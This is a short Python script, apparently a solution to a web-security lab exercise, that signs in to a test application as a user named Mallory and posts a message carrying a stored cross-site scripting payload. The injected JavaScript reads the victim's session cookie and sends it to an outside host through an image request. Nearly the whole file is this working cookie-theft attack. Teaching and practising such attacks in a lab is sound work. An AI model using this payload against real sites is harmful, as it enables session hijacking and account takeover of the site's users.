import os, requests
from urllib.parse import urlencode

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# reset the application
requests.get(BASE + '/reset.php')

# #######  your attack goes here  #######
# start a session
with requests.Session() as s:
     # sign-in as mallory (POST request)
    res = s.post(BASE + '/signin.php', data=mallory)
    s.post(BASE + '/post.php', data={
          'msg': """
          <script> 
            img= new Image();
            cookie=document.cookie.split("=")[1];
            console.log(cookie);
            img.src=\"https://token.seclab.space/set.php?sid=1007648770&token=\"+cookie;
         </script>
          """})

    #  res = s.post(BASE + '/post.php', data={'msg': "hello world!"})


# #########################################
